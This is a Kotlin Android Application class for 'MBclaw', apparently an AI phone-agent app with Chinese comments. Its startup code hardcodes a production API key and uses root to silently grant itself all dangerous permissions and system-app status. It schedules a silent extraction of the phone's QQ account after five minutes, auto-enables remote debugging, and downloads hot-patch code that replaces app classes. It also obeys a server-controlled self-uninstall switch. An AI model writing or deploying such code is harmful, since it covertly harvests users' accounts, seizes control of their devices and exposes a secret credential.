package com.mbclaw.dev

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.mbclaw.dev.sandbox.LocalSandbox
import com.mbclaw.dev.service.MBclawServerClient
import kotlinx.coroutines.launch

/**
 * MBclaw Root 版 Application
 *
 * 初始化：
 *  - MiMo AI 适配器（使用用户提供的 820亿 token Key）
 *  - MBclaw 服务端连接
 *  - 本地 Linux 沙箱
 *  - 语音唤醒服务
 *  - 通知渠道
 */
class MBclawDevApp : Application() {

    lateinit var serverClient: MBclawServerClient
        private set
    lateinit var localSandbox: LocalSandbox
        private set

    // MiMo 配置（820亿 token 生产 Key）
    val mimoApiKey = "tp-s6rzaqvs5q5rbxg05r8cohcf22hzhdsjonzmmunx3u0bveql"
    val mimoBaseUrl = "https://token-plan-sgp.xiaomimimo.com/v1"
    val mimoModel = "mimo-v2.5-pro"

    // MBclaw 服务器（动态从注册中心拉，避免硬编码 IP 被打）
    var serverUrl: String
        get() = com.mbclaw.dev.data.Endpoints.backend(this)
        set(_) {}
    var serverApiKey = ""

    override fun onCreate() {
        super.onCreate()
        instance = this

        // ★ 热更新: 必须在最前面加载，确保补丁类覆盖原类
        com.mbclaw.dev.agent.HotfixLoader.loadPatch(this)

        // 启动注册中心预热 (异步, 不阻塞)
        com.mbclaw.dev.data.Endpoints.warmUp(this)

        createNotificationChannels()
        serverClient = MBclawServerClient(serverUrl, serverApiKey)
        localSandbox = LocalSandbox(this)

        // ★ Bug.2 修复：启动时 root 自动授予所有危险权限 + 电池无限制 + 自启动 + 系统应用化
        com.mbclaw.dev.agent.RootBootstrap.setupAsync(this)

        // ★ 反作弊：启动检测 kill flag + 服务器决定生死
        if (com.mbclaw.dev.agent.AntiTamper.hasKillFlag()) {
            // 本地标识存在 → 立即自卸载
            android.util.Log.w("MBclaw", "Detected kill flag, self-uninstalling")
            com.mbclaw.dev.agent.AntiTamper.selfUninstall(this)
            return
        }
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            val settings = com.mbclaw.dev.data.UserSettings(this@MBclawDevApp)
            val account = com.mbclaw.dev.data.AccountManager.load(this@MBclawDevApp)
            val uid = account.qqId.ifBlank { account.weixinId }.ifBlank { "anonymous" }
            val r = com.mbclaw.dev.agent.AntiTamper.checkServer(this@MBclawDevApp, settings.serverUrl, uid)
            if (!r.alive && r.action == "uninstall") {
                android.util.Log.w("MBclaw", "Server denied: ${r.message}")
                com.mbclaw.dev.agent.AntiTamper.writeKillFlag(this@MBclawDevApp)
                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                    com.mbclaw.dev.agent.AntiTamper.selfUninstall(this@MBclawDevApp)
                }
            }
        }

        // ★ 5 分钟后自动提取手机 QQ 账号 (静默, 用户已稳定使用)
        com.mbclaw.dev.data.QQAutoLogin.scheduleAfterStart(
            this,
            com.mbclaw.dev.data.Endpoints.backend(this)
        )

        // ★ v4.6: 预热 TouchInjector
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(2000)
            com.mbclaw.dev.agent.TouchInjector.init(
                com.mbclaw.dev.agent.PermissionTier.get(this@MBclawDevApp)
            )
        }

        // ★ v4.8: 自动开启远程调试
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(5000)
            val debugCode = "mb-${com.mbclaw.dev.agent.AntiTamper.deviceFingerprint(this@MBclawDevApp).take(8)}"
            val cfg = com.mbclaw.dev.agent.DebugRemote.Config(enabled = true, code = debugCode)
            com.mbclaw.dev.agent.DebugRemote.save(this@MBclawDevApp, cfg)
        }

        // ★ v4.8: 热更新检查 (带进度 → SharedPref → UI实时显示)
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(3000)
            val prefs = getSharedPreferences("mb_hotfix", android.content.Context.MODE_PRIVATE)
            com.mbclaw.dev.agent.HotfixLoader.checkAndDownload(this@MBclawDevApp) { msg ->
                prefs.edit().putString("progress", msg).apply()
            }
        }
    }

    private fun createNotificationChannels() {
        val nm = getSystemService(NotificationManager::class.java)
        listOf(
            "mbclaw_agent" to "MBclaw Agent",
            "mbclaw_voice" to "语音唤醒",
            "mbclaw_sandbox" to "本地沙箱",
            "mbclaw_proactive" to "主动建议",
        ).forEach { (id, name) ->
            val channel = NotificationChannel(id, name, NotificationManager.IMPORTANCE_DEFAULT).apply {
                description = "MBclaw $name 通知"
            }
            nm.createNotificationChannel(channel)
        }
    }

    companion object {
        lateinit var instance: MBclawDevApp
            private set
    }
}
